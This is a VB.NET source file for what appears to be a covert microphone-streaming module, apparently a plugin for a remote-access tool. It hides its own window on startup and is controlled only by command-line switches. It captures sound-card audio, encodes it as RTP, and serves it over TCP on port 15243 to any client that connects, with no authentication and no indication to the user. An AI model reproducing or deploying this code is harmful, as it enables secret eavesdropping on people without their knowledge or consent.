Imports System.Text
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Public Class Main
    Dim ServerPort As Integer = 15243
    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Hide()
        Init()
        ReadParameters(Command())
    End Sub
    Private Sub Main_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            m_IsFormMain = False
            StopRecordingFromSounddevice_Server()
            StopServer()
        Catch ex As Exception
            AddToLog("Main_FormClosing@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub ReadParameters(ByVal parameter As String)
        Try
            If parameter <> Nothing Then
                Dim parametros() As String = parameter.Split(" ")
                For Each item As String In parametros
                    If item.ToLower Like "*/startmicstreaming*" Then
                        'Comenzar streaming TCP/IP del microfono
                        StartMicStreaming(ServerPort)

                    ElseIf item.ToLower Like "*--port*" Then
                        Dim args As String() = item.Split("-")
                        ServerPort = Integer.Parse(args(3))

                    ElseIf item.ToLower Like "*/stopmicstream*" Then
                        'Detiene el streaming del microfono
                        StopMicStreaming()

                    ElseIf item.ToLower Like "*/stop*" Then
                        'Detiene todo y se cierra
                        End
                    End If
                Next
            Else
                End
            End If
        Catch ex As Exception
            AddToLog("ReadParameters@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub StartMicStreaming(ByVal port As Integer)
        Try
            Dim threadmicStreaming As Thread = New Thread(New ParameterizedThreadStart(AddressOf Starter))
            threadmicStreaming.Start(port)
        Catch ex As Exception
            AddToLog("StartMicStreaming@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopMicStreaming()
        Try
            Stopper()
        Catch ex As Exception
            AddToLog("StopMicStreaming@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Dim m_Client As TcpClient
    Dim m_Server As TCPServer
    Dim PRIVADA As String
    Dim PUERTO As Integer
    Dim m_SoundBufferCount As Integer = 8
    Dim m_PrototolClient As New WinSound.Protocol(WinSound.ProtocolTypes.LH, Encoding.[Default])
    Dim m_DictionaryServerDatas As New Dictionary(Of ServerThread, ServerThreadData)()
    Dim m_Recorder_Client As WinSound.Recorder
    Dim m_Recorder_Server As WinSound.Recorder
    Dim m_PlayerClient As WinSound.Player
    Dim m_RecorderFactor As UInteger = 4
    Dim m_JitterBufferClientRecording As WinSound.JitterBuffer
    Dim m_JitterBufferClientPlaying As WinSound.JitterBuffer
    Dim m_JitterBufferServerRecording As WinSound.JitterBuffer
    Dim m_FileHeader As New WinSound.WaveFileHeader()
    Dim m_IsFormMain As Boolean = True
    Dim m_SequenceNumber As Long = 4596
    Dim m_TimeStamp As Long = 0
    Dim m_Version As Integer = 2
    Dim m_Padding As Boolean = False
    Dim m_Extension As Boolean = False
    Dim m_CSRCCount As Integer = 0
    Dim m_Marker As Boolean = False
    Dim m_PayloadType As Integer = 0
    Dim m_SourceId As UInteger = 0
    Dim m_TimerProgressBarFile As New System.Windows.Forms.Timer()
    Dim m_TimerProgressBarPlayingClient As New System.Windows.Forms.Timer()
    Dim m_TimerMixed As WinSound.EventTimer = Nothing
    Dim m_FilePayloadBuffer As [Byte]()
    Dim m_RTPPartsLength As Integer = 0
    Dim m_Milliseconds As UInteger = 20
    Dim m_TimerDrawProgressBar As System.Windows.Forms.Timer
    Dim LockerDictionary As New [Object]()
    Public Shared DictionaryMixed As Dictionary(Of [Object], Queue(Of List(Of [Byte]))) = New Dictionary(Of [Object], Queue(Of List(Of Byte)))()
    Dim m_Encoding As Encoding = Encoding.GetEncoding(1252)
    Dim RecordingJitterBufferCount As Integer = 8
    Dim JitterBufferCountServer As UInteger = 20
    Dim SamplesPerSecondServer As Integer = 8000
    Dim BitsPerSampleServer As Integer = 16
    Dim ChannelsServer As Integer = 1
    Dim UseJitterBufferServerRecording As Boolean = True
    Dim ServerNoSpeakAll As Boolean = False
    Public Sub Starter(ByVal port As Integer)
        Try
            Try
                Dim MIHOST As String = My.Computer.Name
                Dim MIIP As IPHostEntry = Dns.GetHostEntry(MIHOST)
                For Each DIRECCION As IPAddress In Dns.GetHostEntry(MIHOST).AddressList
                    If DIRECCION.ToString.StartsWith("192.") Or DIRECCION.ToString.StartsWith("172.") Or DIRECCION.ToString.StartsWith("169.") Or
                        DIRECCION.ToString.StartsWith("10.") Then
                        PRIVADA = DIRECCION.ToString
                        Exit For
                    End If
                Next
                PUERTO = port
                Try
                    InitJitterBufferServerRecording()
                Catch ex As Exception
                    AddToLog("Starter(0)@Main", "Error: " & ex.Message, True)
                End Try
                Try
                    If IsServerRunning Then
                        StopServer()
                        StopRecordingFromSounddevice_Server()
                        StopTimerMixed()
                    Else
                        StartServer()
                        If ServerNoSpeakAll = False Then
                            StartRecordingFromSounddevice_Server()
                        End If
                        StartTimerMixed()
                    End If
                Catch ex As Exception
                    AddToLog("Starter(1)@Main", "Error: " & ex.Message, True)
                End Try
            Catch ex As Exception
                AddToLog("Starter(2)@Main", "Error: " & ex.Message, True)
            End Try
        Catch ex As Exception
            AddToLog("Starter(3)@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Public Sub Stopper()
        Try
            m_IsFormMain = False
            StopRecordingFromSounddevice_Server()
            StopServer()
        Catch ex As Exception
            AddToLog("Stopper@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub FillRTPBufferWithPayloadData(ByVal header As WinSound.WaveFileHeader)
        m_RTPPartsLength = WinSound.Utils.GetBytesPerInterval(header.SamplesPerSecond, header.BitsPerSample, header.Channels)
        m_FilePayloadBuffer = header.Payload
    End Sub
    Private Sub OnTimerSendMixedDataToAllClients()
        Try
            Dim dic As Dictionary(Of [Object], List(Of [Byte])) = New Dictionary(Of Object, List(Of Byte))()
            Dim listlist As New List(Of List(Of Byte))()
            Dim copy As Dictionary(Of [Object], Queue(Of List(Of [Byte]))) = New Dictionary(Of Object, Queue(Of List(Of Byte)))(DictionaryMixed)
            If True Then
                Dim q As Queue(Of List(Of Byte)) = Nothing
                For Each obj As [Object] In copy.Keys
                    q = copy(obj)
                    If q.Count > 0 Then
                        dic(obj) = q.Dequeue()
                        listlist.Add(dic(obj))
                    End If
                Next
            End If
            If listlist.Count > 0 Then
                Dim mixedBytes As [Byte]() = WinSound.Mixer.MixBytes(listlist, BitsPerSampleServer).ToArray()
                Dim listMixed As New List(Of [Byte])(mixedBytes)
                For Each client As ServerThread In m_Server.Clients
                    If client.IsMute = False Then
                        Dim mixedBytesClient As [Byte]() = mixedBytes
                        If dic.ContainsKey(client) Then
                            Dim listClient As List(Of [Byte]) = dic(client)
                            mixedBytesClient = WinSound.Mixer.SubsctractBytes_16Bit(listMixed, listClient).ToArray()
                        End If
                        Dim rtp As WinSound.RTPPacket = ToRTPPacket(mixedBytesClient, BitsPerSampleServer, ChannelsServer)
                        Dim rtpBytes As [Byte]() = rtp.ToBytes()
                        client.Send(m_PrototolClient.ToBytes(rtpBytes))
                    End If
                Next
            End If
        Catch ex As Exception
            m_TimerProgressBarPlayingClient.[Stop]()
            AddToLog("OnTimerSendMixedDataToAllClients@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub InitJitterBufferServerRecording()
        If m_JitterBufferServerRecording IsNot Nothing Then
            RemoveHandler m_JitterBufferServerRecording.DataAvailable, AddressOf OnJitterBufferServerDataAvailable
        End If
        m_JitterBufferServerRecording = New WinSound.JitterBuffer(Nothing, RecordingJitterBufferCount, 20)
        AddHandler m_JitterBufferServerRecording.DataAvailable, AddressOf OnJitterBufferServerDataAvailable
    End Sub
    Private ReadOnly Property UseJitterBufferServer() As Boolean
        Get
            Return JitterBufferCountServer >= 2
        End Get
    End Property
    Private Sub StartRecordingFromSounddevice_Server()
        Try
            If IsRecorderFromSounddeviceStarted_Server = False Then
                Dim bufferSize As Integer = 0
                If UseJitterBufferServerRecording Then
                    bufferSize = WinSound.Utils.GetBytesPerInterval(CUInt(SamplesPerSecondServer), BitsPerSampleServer, ChannelsServer) * CInt(m_RecorderFactor)
                Else
                    bufferSize = WinSound.Utils.GetBytesPerInterval(CUInt(SamplesPerSecondServer), BitsPerSampleServer, ChannelsServer)
                End If
                If bufferSize > 0 Then
                    m_Recorder_Server = New WinSound.Recorder()
                    AddHandler m_Recorder_Server.DataRecorded, AddressOf OnDataReceivedFromSoundcard_Server
                    If m_Recorder_Server.Start(Nothing, SamplesPerSecondServer, BitsPerSampleServer, ChannelsServer, m_SoundBufferCount, bufferSize) Then
                        DictionaryMixed(Me) = New Queue(Of List(Of Byte))()
                        m_JitterBufferServerRecording.Start()
                    End If
                End If
            End If
        Catch ex As Exception
            AddToLog("StartRecordingFromSounddevice_Server@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub StopRecordingFromSounddevice_Server()
        Try
            If IsRecorderFromSounddeviceStarted_Server Then
                m_Recorder_Server.[Stop]()
                RemoveHandler m_Recorder_Server.DataRecorded, AddressOf OnDataReceivedFromSoundcard_Server
                m_Recorder_Server = Nothing
                m_JitterBufferServerRecording.[Stop]()
            End If
        Catch ex As Exception
            AddToLog("StopRecordingFromSounddevice_Server@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub OnDataReceivedFromSoundcard_Server(ByVal data As [Byte]())
        Try
            SyncLock Me
                If IsServerRunning Then
                    If m_IsFormMain Then
                        If ServerNoSpeakAll = False Then
                            Dim bytesPerInterval As Integer = WinSound.Utils.GetBytesPerInterval(CUInt(SamplesPerSecondServer), BitsPerSampleServer, ChannelsServer)
                            Dim count As Integer = data.Length / bytesPerInterval
                            Dim currentPos As Integer = 0
                            For i As Integer = 0 To count - 1
                                Dim partBytes As [Byte]() = New [Byte](bytesPerInterval - 1) {}
                                Array.Copy(data, currentPos, partBytes, 0, bytesPerInterval)
                                currentPos += bytesPerInterval
                                Dim q As Queue(Of List(Of [Byte])) = DictionaryMixed(Me)
                                If q.Count < 10 Then
                                    q.Enqueue(New List(Of [Byte])(partBytes))
                                End If
                            Next
                        End If
                    End If
                End If
            End SyncLock
        Catch ex As Exception
            AddToLog("OnDataReceivedFromSoundcard_Server@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub OnJitterBufferServerDataAvailable(ByVal sender As [Object], ByVal rtp As WinSound.RTPPacket)
        Try
            If IsServerRunning Then
                If m_IsFormMain Then
                    Dim rtpBytes As [Byte]() = rtp.ToBytes()
                    Dim list As New List(Of ServerThread)(m_Server.Clients)
                    For Each client As ServerThread In list
                        If client.IsMute = False Then
                            Try
                                client.Send(m_PrototolClient.ToBytes(rtpBytes))
                            Catch generatedExceptionName As Exception
                            End Try
                        End If
                    Next
                End If
            End If
        Catch ex As Exception
            Dim sf As New System.Diagnostics.StackFrame(True)
            AddToLog("OnJitterBufferServerDataAvailable@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Function ToRTPData(ByVal data As [Byte](), ByVal bitsPerSample As Integer, ByVal channels As Integer) As [Byte]()
        Dim rtp As WinSound.RTPPacket = ToRTPPacket(data, bitsPerSample, channels)
        Dim rtpBytes As [Byte]() = rtp.ToBytes()
        Return rtpBytes
    End Function
    Private Function ToRTPPacket(ByVal linearData As [Byte](), ByVal bitsPerSample As Integer, ByVal channels As Integer) As WinSound.RTPPacket
        Dim mulaws As [Byte]() = WinSound.Utils.LinearToMulaw(linearData, bitsPerSample, channels)
        Dim rtp As New WinSound.RTPPacket()
        rtp.Data = mulaws
        rtp.CSRCCount = m_CSRCCount
        rtp.Extension = m_Extension
        rtp.HeaderLength = WinSound.RTPPacket.MinHeaderLength
        rtp.Marker = m_Marker
        rtp.Padding = m_Padding
        rtp.PayloadType = m_PayloadType
        rtp.Version = m_Version
        rtp.SourceId = m_SourceId
        Try
            rtp.SequenceNumber = Convert.ToUInt16(m_SequenceNumber)
            m_SequenceNumber += 1
        Catch generatedExceptionName As Exception
            m_SequenceNumber = 0
        End Try
        Try
            rtp.Timestamp = Convert.ToUInt32(m_TimeStamp)
            m_TimeStamp += mulaws.Length
        Catch generatedExceptionName As Exception
            m_TimeStamp = 0
        End Try
        Return rtp
    End Function
    Private ReadOnly Property IsRecorderFromSounddeviceStarted_Server() As Boolean
        Get
            If m_Recorder_Server IsNot Nothing Then
                Return m_Recorder_Server.Started
            End If
            Return False
        End Get
    End Property
    Private Sub StartServer()
        Try
            If IsServerRunning = False Then
                If PRIVADA.Length > 0 AndAlso PUERTO > 0 Then
                    m_Server = New TCPServer()
                    AddHandler m_Server.ClientConnected, AddressOf OnServerClientConnected
                    AddHandler m_Server.ClientDisconnected, AddressOf OnServerClientDisconnected
                    AddHandler m_Server.DataReceived, AddressOf OnServerDataReceived
                    m_Server.Start(PRIVADA, PUERTO)
                End If
            End If
        Catch ex As Exception
            AddToLog("StartServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub StopServer()
        Try
            If IsServerRunning = True Then
                DeleteAllServerThreadDatas()
                m_Server.[Stop]()
                RemoveHandler m_Server.ClientConnected, AddressOf OnServerClientConnected
                RemoveHandler m_Server.ClientDisconnected, AddressOf OnServerClientDisconnected
                RemoveHandler m_Server.DataReceived, AddressOf OnServerDataReceived
            End If
            m_Server = Nothing
        Catch ex As Exception
            AddToLog("StopServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub OnServerClientConnected(ByVal st As ServerThread)
        Try
            Dim data As New ServerThreadData()
            data.Init(st, Nothing, SamplesPerSecondServer, BitsPerSampleServer, ChannelsServer, m_SoundBufferCount,
            JitterBufferCountServer, m_Milliseconds)
            m_DictionaryServerDatas(st) = data
            SendConfigurationToClient(data)
        Catch ex As Exception
            AddToLog("OnServerClientConnected@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub SendConfigurationToClient(ByVal data As ServerThreadData)
        Dim bytesConfig As [Byte]() = m_Encoding.GetBytes([String].Format("SamplesPerSecond:{0}", SamplesPerSecondServer))
        data.ServerThread.Send(m_PrototolClient.ToBytes(bytesConfig))
    End Sub
    Private Sub OnServerClientDisconnected(ByVal st As ServerThread, ByVal info As String)
        Try
            If m_DictionaryServerDatas.ContainsKey(st) Then
                Dim data As ServerThreadData = m_DictionaryServerDatas(st)
                data.Dispose()
                SyncLock LockerDictionary
                    m_DictionaryServerDatas.Remove(st)
                End SyncLock
            End If
            DictionaryMixed.Remove(st)
        Catch ex As Exception
            AddToLog("OnServerClientDisconnected@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub StartTimerMixed()
        If m_TimerMixed Is Nothing Then
            m_TimerMixed = New WinSound.EventTimer()
            AddHandler m_TimerMixed.TimerTick, AddressOf OnTimerSendMixedDataToAllClients
            m_TimerMixed.Start(20, 0)
        End If
    End Sub
    Private Sub StopTimerMixed()
        If m_TimerMixed IsNot Nothing Then
            m_TimerMixed.[Stop]()
            RemoveHandler m_TimerMixed.TimerTick, AddressOf OnTimerSendMixedDataToAllClients
            m_TimerMixed = Nothing
        End If
    End Sub
    Private Sub OnServerDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
        If m_DictionaryServerDatas.ContainsKey(st) Then
            Dim stData As ServerThreadData = m_DictionaryServerDatas(st)
            If stData.Protocol IsNot Nothing Then
                stData.Protocol.Receive_LH(st, data)
            End If
        End If
    End Sub
    Private Sub DeleteAllServerThreadDatas()
        SyncLock LockerDictionary
            Try
                For Each info As ServerThreadData In m_DictionaryServerDatas.Values
                    info.Dispose()
                Next
                m_DictionaryServerDatas.Clear()
            Catch ex As Exception
                AddToLog("DeleteAllServerThreadDatas@Main", "Error: " & ex.Message, True)
            End Try
        End SyncLock
    End Sub
    Private ReadOnly Property IsServerRunning() As Boolean
        Get
            If m_Server IsNot Nothing Then
                Return m_Server.State = TCPServer.ListenerState.Started
            End If
            Return False
        End Get
    End Property
    Private ReadOnly Property IsClientConnected() As Boolean
        Get
            If m_Client IsNot Nothing Then
                Return m_Client.Connected
            End If
            Return False
        End Get
    End Property
End Class
Public Class ServerThreadData
    Public Sub New()
    End Sub
    Public ServerThread As ServerThread
    Public Player As WinSound.Player
    Public JitterBuffer As WinSound.JitterBuffer
    Public Protocol As WinSound.Protocol
    Public SamplesPerSecond As Integer = 8000
    Public BitsPerSample As Integer = 16
    Public SoundBufferCount As Integer = 8
    Public JitterBufferCount As UInteger = 20
    Public JitterBufferMilliseconds As UInteger = 20
    Public Channels As Integer = 1
    Private IsInitialized As Boolean = False
    Public IsMute As Boolean = False
    Public Shared IsMuteAll As Boolean = False
    Public Sub Init(ByVal st As ServerThread, ByVal soundDeviceName As String, ByVal samplesPerSecond As Integer, ByVal bitsPerSample As Integer, ByVal channels As Integer, ByVal soundBufferCount As Integer,
     ByVal jitterBufferCount As UInteger, ByVal jitterBufferMilliseconds As UInteger)
        Me.ServerThread = st
        Me.SamplesPerSecond = samplesPerSecond
        Me.BitsPerSample = bitsPerSample
        Me.Channels = channels
        Me.SoundBufferCount = soundBufferCount
        Me.JitterBufferCount = jitterBufferCount
        Me.JitterBufferMilliseconds = jitterBufferMilliseconds
        Me.Player = New WinSound.Player()
        Me.Player.Open(soundDeviceName, samplesPerSecond, bitsPerSample, channels, soundBufferCount)
        If jitterBufferCount >= 2 Then
            Me.JitterBuffer = New WinSound.JitterBuffer(st, jitterBufferCount, jitterBufferMilliseconds)
            AddHandler Me.JitterBuffer.DataAvailable, AddressOf OnJitterBufferDataAvailable
            Me.JitterBuffer.Start()
        End If
        Me.Protocol = New WinSound.Protocol(WinSound.ProtocolTypes.LH, Encoding.[Default])
        AddHandler Me.Protocol.DataComplete, AddressOf OnProtocolDataComplete
        Main.DictionaryMixed(st) = New Queue(Of List(Of Byte))()
        IsInitialized = True
    End Sub
    Public Sub Dispose()
        If Protocol IsNot Nothing Then
            RemoveHandler Me.Protocol.DataComplete, AddressOf OnProtocolDataComplete
            Me.Protocol = Nothing
        End If

        If JitterBuffer IsNot Nothing Then
            JitterBuffer.[Stop]()
            RemoveHandler JitterBuffer.DataAvailable, AddressOf OnJitterBufferDataAvailable
            Me.JitterBuffer = Nothing
        End If
        If Player IsNot Nothing Then
            Player.Close()
            Me.Player = Nothing
        End If
        IsInitialized = False
    End Sub
    Private Sub OnProtocolDataComplete(ByVal sender As [Object], ByVal bytes As [Byte]())
        If IsInitialized Then
            If ServerThread IsNot Nothing AndAlso Player IsNot Nothing Then
                Try
                    If Player.Opened Then
                        Dim rtp As New WinSound.RTPPacket(bytes)
                        If rtp.Data IsNot Nothing Then
                            If JitterBuffer IsNot Nothing AndAlso JitterBuffer.Maximum >= 2 Then
                                JitterBuffer.AddData(rtp)
                            Else
                                If IsMuteAll = False AndAlso IsMute = False Then
                                    Dim linearBytes As [Byte]() = WinSound.Utils.MuLawToLinear(rtp.Data, Me.BitsPerSample, Me.Channels)
                                    Player.PlayData(linearBytes, False)
                                End If
                            End If
                        End If
                    End If
                Catch ex As Exception

                    IsInitialized = False
                End Try
            End If
        End If
    End Sub
    Private Sub OnJitterBufferDataAvailable(ByVal sender As [Object], ByVal rtp As WinSound.RTPPacket)
        Try
            If Player IsNot Nothing Then
                Dim linearBytes As [Byte]() = WinSound.Utils.MuLawToLinear(rtp.Data, BitsPerSample, Channels)

                If IsMuteAll = False AndAlso IsMute = False Then
                    Player.PlayData(linearBytes, False)
                End If
                Dim q As Queue(Of List(Of [Byte])) = Main.DictionaryMixed(sender)
                If q.Count < 10 Then
                    Main.DictionaryMixed(sender).Enqueue(New List(Of [Byte])(linearBytes))
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub
End Class
Public Class TCPServer
    Public Sub New()
    End Sub
    Private m_endpoint As IPEndPoint
    Private m_tcpip As TcpListener
    Private m_ThreadMainServer As Thread
    Private m_State As ListenerState
    Private m_threads As New List(Of ServerThread)()
    Public Delegate Sub DelegateClientConnected(ByVal st As ServerThread)
    Public Delegate Sub DelegateClientDisconnected(ByVal st As ServerThread, ByVal info As String)
    Public Delegate Sub DelegateDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
    Public Event ClientConnected As DelegateClientConnected
    Public Event ClientDisconnected As DelegateClientDisconnected
    Public Event DataReceived As DelegateDataReceived
    Public Enum ListenerState
        None
        Started
        Stopped
        [Error]
    End Enum
    Public ReadOnly Property Clients() As List(Of ServerThread)
        Get
            Return m_threads
        End Get
    End Property
    Public ReadOnly Property State() As ListenerState
        Get
            Return m_State
        End Get
    End Property
    Public ReadOnly Property Listener() As TcpListener
        Get
            Return Me.m_tcpip
        End Get
    End Property
    Public Sub Start(ByVal strIPAdress As String, ByVal Port As Integer)
        m_endpoint = New IPEndPoint(IPAddress.Parse(strIPAdress), Port)
        m_tcpip = New TcpListener(m_endpoint)
        If m_tcpip Is Nothing Then
            Return
        End If
        Try
            m_tcpip.Start()
            m_ThreadMainServer = New Thread(AddressOf Run)
            m_ThreadMainServer.Start()
            Me.m_State = ListenerState.Started
        Catch ex As Exception
            m_tcpip.[Stop]()
            Me.m_State = ListenerState.[Error]
            Throw ex
        End Try
    End Sub
    Private Sub Run()
        While True
            Dim client As TcpClient = m_tcpip.AcceptTcpClient()
            Dim st As New ServerThread(client)
            AddHandler st.DataReceived, New ServerThread.DelegateDataReceived(AddressOf OnDataReceived)
            AddHandler st.ClientDisconnected, New ServerThread.DelegateClientDisconnected(AddressOf OnClientDisconnected)
            OnClientConnected(st)
            Try
                client.Client.BeginReceive(st.ReadBuffer, 0, st.ReadBuffer.Length, SocketFlags.None, AddressOf st.Receive, client.Client)
            Catch ex As Exception

            End Try
        End While
    End Sub
    Public Function Send(ByVal data As [Byte]()) As Integer
        Dim list As New List(Of ServerThread)(m_threads)
        For Each sv As ServerThread In list
            Try
                If data.Length > 0 Then
                    sv.Send(data)
                End If
            Catch generatedExceptionName As Exception
            End Try
        Next
        Return m_threads.Count
    End Function
    Private Sub OnDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
        RaiseEvent DataReceived(st, data)
    End Sub
    Private Sub OnClientDisconnected(ByVal st As ServerThread, ByVal info As String)
        m_threads.Remove(st)
        RaiseEvent ClientDisconnected(st, info)
    End Sub
    Private Sub OnClientConnected(ByVal st As ServerThread)
        If Not m_threads.Contains(st) Then
            m_threads.Add(st)
        End If
        RaiseEvent ClientConnected(st)
    End Sub
    Public Sub [Stop]()
        Try
            If m_ThreadMainServer IsNot Nothing Then
                m_ThreadMainServer.Abort()
                System.Threading.Thread.Sleep(100)
            End If
            Dim en As IEnumerator = m_threads.GetEnumerator()
            While en.MoveNext()
                Dim st As ServerThread = DirectCast(en.Current, ServerThread)
                st.[Stop]()
                RaiseEvent ClientDisconnected(st, "Verbindung wurde beendet")
            End While
            If m_tcpip IsNot Nothing Then
                m_tcpip.[Stop]()
                m_tcpip.Server.Close()
            End If
            m_threads.Clear()
            Me.m_State = ListenerState.Stopped
        Catch generatedExceptionName As Exception
            Me.m_State = ListenerState.[Error]
        End Try
    End Sub
End Class
Public Class ServerThread
    Private m_IsStopped As Boolean = False
    Private m_Connection As TcpClient = Nothing
    Public ReadBuffer As Byte() = New Byte(1023) {}
    Public IsMute As Boolean = False
    Public Name As [String] = ""
    Public Delegate Sub DelegateDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
    Public Event DataReceived As DelegateDataReceived
    Public Delegate Sub DelegateClientDisconnected(ByVal sv As ServerThread, ByVal info As String)
    Public Event ClientDisconnected As DelegateClientDisconnected
    Public ReadOnly Property Client() As TcpClient
        Get
            Return m_Connection
        End Get
    End Property
    Public ReadOnly Property IsStopped() As Boolean
        Get
            Return m_IsStopped
        End Get
    End Property
    Public Sub New(ByVal connection As TcpClient)
        Me.m_Connection = connection
    End Sub
    Public Sub Receive(ByVal ar As IAsyncResult)
        Try
            If Me.m_Connection.Client.Connected = False Then
                Return
            End If
            If ar.IsCompleted Then
                Dim bytesRead As Integer = m_Connection.Client.EndReceive(ar)
                If bytesRead > 0 Then
                    Dim data As [Byte]() = New Byte(bytesRead - 1) {}
                    System.Array.Copy(ReadBuffer, 0, data, 0, bytesRead)
                    RaiseEvent DataReceived(Me, data)
                    m_Connection.Client.BeginReceive(ReadBuffer, 0, ReadBuffer.Length, SocketFlags.None, AddressOf Receive, m_Connection.Client)
                Else
                    HandleDisconnection("CONEXION TERMINADA")
                End If
            End If
        Catch ex As Exception
            HandleDisconnection(ex.Message)
        End Try
    End Sub
    Public Sub HandleDisconnection(ByVal reason As String)
        m_IsStopped = True
        RaiseEvent ClientDisconnected(Me, reason)
    End Sub
    Public Sub Send(ByVal data As [Byte]())
        Try
            If Me.m_IsStopped = False Then
                Dim ns As NetworkStream = Me.m_Connection.GetStream()
                SyncLock ns
                    ns.Write(data, 0, data.Length)
                End SyncLock
            End If
        Catch ex As Exception
            Me.m_Connection.Close()
            Me.m_IsStopped = True
            RaiseEvent ClientDisconnected(Me, ex.Message)
            Throw ex
        End Try
    End Sub
    Public Sub [Stop]()
        If m_Connection.Client.Connected = True Then
            m_Connection.Client.Disconnect(False)
        End If
        Me.m_IsStopped = True
    End Sub
End Class